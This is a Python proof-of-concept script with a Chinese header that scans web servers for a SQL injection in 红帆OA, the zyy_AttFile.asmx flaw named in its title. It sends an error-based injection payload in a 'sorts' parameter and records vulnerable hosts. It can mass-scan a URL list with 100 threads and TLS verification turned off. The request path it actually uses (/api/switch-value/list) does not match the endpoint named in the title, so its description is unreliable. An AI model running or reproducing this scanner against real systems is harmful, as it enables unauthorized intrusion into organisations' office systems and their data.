# 红帆OA zyy_AttFile.asmx SQL注入漏洞

import requests, sys, argparse, re, json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
                        
                    ███████╗ ██████╗ ██╗     
                    ██╔════╝██╔═══██╗██║     
                    ███████╗██║   ██║██║     
                    ╚════██║██║▄▄ ██║██║     
                    ███████║╚██████╔╝███████╗
                    ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                            author:秋妤
                                            date:2024.09.22
                                            version:1.0
 """
    print(test)




def poc(target):
    payload = '/api/switch-value/list?sorts=%5B%7B%22Field%22:%221-CONVERT(VARCHAR(32),%20HASHBYTES(%27MD5%27,%20%271234%27),%202);%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c69905a7'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
        'If-Modified-Since':'Tue, 02 Mar 2021 07:52:43 GMT',
        'If-None-Match':'"aa32739fd71:0"',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if '转换成数据类型' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('红帆_result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        print(e)

def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description = "这是一个关于红帆OA zyy_AttFile.asmx SQL注入漏洞的脚本")
    parser.add_argument("-u", "--url", dest = "url", help = "Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter your file")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
